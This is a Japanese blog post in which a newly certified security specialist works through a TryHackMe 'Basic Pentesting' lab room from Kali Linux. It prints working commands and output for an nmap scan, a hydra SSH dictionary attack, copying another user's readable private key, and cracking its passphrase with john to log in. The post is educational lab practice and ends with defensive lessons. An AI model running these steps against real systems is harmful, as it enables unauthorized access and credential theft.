---
title: "試験に受かっただけの未登録セキスペが【7日間でハッキングを始める本】を読む(環境構築〜Day2編)"
emoji: "🌊"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: [
  "tryhackme",
  "kalilinux",
  "security"
]
published: true
---
# きっかけ
令和6年秋実施の情報処理安全確保支援士に合格しました🌸  
合格したとはいえ  
:::message
教科書をなぞって合格しただけと言える状態でセキュリティに詳しいとは言えない状態
:::
であるので、何らかの形で生きた知識に昇華させたいと思っていた。  

そんな時、知人のこの本の話題になり、手にとってみることにした。

# 本の内容
[Try Hack Me](https://tryhackme.com/)というサービスを使用したハンズオン形式の内容  
PCにKali Linuxを立てたのち、TryHackMeのサービスで立てたサーバーをクラックしていく。

## なぜKali Linux？
Kaliにはクラッキングに便利なツールが標準で備わっており、セキュリティの分野ではよく使用されるディストリビューションらしい。

# Day1（環境構築＆チュートリアル）
本ではWindowsの上にVirtual BoxでKaliを立てて進めていたが、自分はMacユーザなので異なるアプローチをとった。
Dockerを使用してKaliを立てて、そこにリモートデスクトップで接続する方法で実施した。
以下のページがとても参考になった。

https://zenn.dev/k_ing/articles/abcbe71c105b3d

:::message alert
最小構成のKaliが立ち上がるため、ツールが足りていない。
必要なツールを以下のコマンドでインストールする必要がある。
:::

```bash
sudo apt install kali-linux-large
```

Windows appでリモート接続すると以下のような画面となるはず。
![](/images/kali_desktop.png)

## OpenVPNの設定
### 本の通りに設定
TryHackMeで立ち上がるサーバーのローカルIPアドレスが、画面に表示されるのでVPNを繋いで同じネットワークにする必要がある
:::message
IPA試験でも出る基本的なことですが、10.xxx.xxx.xxx形式のIPが表示されるので、これはローカルIPアドレスだなとわかります。
:::

## Tutrial Room
Day1で攻略するRoom
内容は単純で、表示されたIPアドレスにKaliのブラウザでアクセスするだけ。

# Day2(Room: Basic Pentesting)
クラッキングっぽくなってきたRoom。
やることは以下。
- ポートスキャン
- 辞書攻撃
- sshキーのパスフレーズのクラック

セキスペの試験ではお馴染みすぎる単語が並んでいるが、実際にどんな手法を用いて、攻撃するかは全く知りません。

## ポートスキャンとは
> **ポートスキャン**は、実際にパケットを送りつけて攻撃対象サーバからの応答を確かめ、**接続可能なポートを調査する手法**です。
> コネクション確立を試みることで調査するTCPスキャンと、UDPパケットを送って調査するUDPスキャンがあります。  

（出典：TAC出版「2024年度版情報処理安全確保支援士ALL IN ONE パーフェクトマスター」）

### ポートスキャンを試してみる
ポートスキャンを行うには`nmap`というツールを使用します。
オプションの詳細は調べるか、AIに聞いてください。
以下のコマンドでは、TCPスキャンを`10.10.201.17`に対して行い、稼働しているサービスの一覧をファイルに出しています。
```bash
$ nmap -sV -Pn -oN nmap.txt -v 10.10.201.17
```
見つかったポートに対して、クラックを仕掛けていくことになります。

## 辞書攻撃とは
> 辞書に記載されている単語をパスワードとして順に試す方法。Webサイトにまとめられている用語集などの単語も含む。

（出典：TAC出版「2024年度版情報処理安全確保支援士ALL IN ONE パーフェクトマスター」）

### 辞書攻撃を試してみる
紆余曲折あり、ユーザID（例：taro）をゲットしました。
`taro`をユーザID、辞書のリストをパスワードとして、辞書攻撃を仕掛けます。
辞書攻撃には`hydra`というツールを使用します。
```bash
$ hydra -l taro -P /usr/share/wordlists/rockyou.txt ssh://10.10.201.17 -t 4
```
`/usr/share/wordlists/rockyou.txt`というのが辞書になります。Kaliに含まれます。
実行後以下のような結果が得られます。
```
[22][ssh] host: 10.10.201.17   login: taro   password: passWord
```
パスワードをゲットしました。あとはsshログインしてよしなに暴れ回ります。

## sshキーのクラック
本のDay2はここまでで終わりですが、Roomの課題はまだあるので続きます。

`/home`に他のユーザのディレクトリが見えますが、なんとその中にSSHキーが含まれており、パーミッションが適切でないため、中身が参照できてしまいます。

```bash
$ ls -al /home/hanako/.ssh/
total 20
drwxr-xr-x 2 hanako hanako 4096 Apr 23  2018 .
drwxr-xr-x 5 hanako hanako 4096 Apr 23  2018 ..
-rw-rw-r-- 1 hanako hanako  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 hanako hanako 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 hanako hanako  771 Apr 19  2018 id_rsa.pub
```
hanakoの`id_rsa`の中身をいただきます。
```bash
cat /home/hanako/.ssh/id_rsa
```
中身をコピーして新たにファイルを作り、SSH接続を試みます。
```bash
vim hanako_id_rsa
ssh -i hanako_id_rsa hanako@10.10.201.17
Enter passphrase for key 'hanako_id_rsa': 
```
パスフレーズを求められるので、パスフレーズをクラックします。
使用するツールは`john the ripper`です。これもkaliに含まれます。
```bash
# ssh2john.py
# johnが理解できるハッシュ形式に変換
$ python3 /usr/share/john/ssh2john.py hanako_id_rsa > hash.txt

# 変換したハッシュを対象にパスワードリストで解析
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{xxxxxxxx}          (hanako_id_rsa)     
1g 0:00:00:00 DONE (2025-07-29 23:25) 3.846g/s 318276p/s 318276c/s 318276C/s bird..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
`{xxxxxxxx}`がパスフレーズです。
これでSSH接続しましょう。
```bash
$ ssh -i hanako_id_rsa hanako@10.10.138.120
Enter passphrase for key 'hanako_id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 29 Jul 2025 10:25:49 AM EDT

  System load:  0.0                Processes:             111
  Usage of /:   49.8% of 13.62GB   Users logged in:       1
  Memory usage: 44%                IPv4 address for eth0: 10.10.138.120
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sun Jun 22 13:40:04 2025 from 10.23.8.228
```
サーバは我が手中に堕ちました。

# やってみて
当たり前のようにクラッキングツールがLinuxのディストリビューションに含まれていて、誰でも試すことができるという状態に驚きを感じました。  
秘密鍵からパスフレーズまで割り出される可能性も驚きました。SSHキーの安全な保管と強固なパスワードの設定は、今後も気をつけようと思います。
また、教科書通りの勉強を試してみることでより定着したかなと思います。  
私自身が別にセキュリティを専門にしているわけではないのですが、生きた知識としてDay3以降も続けていこうと思います。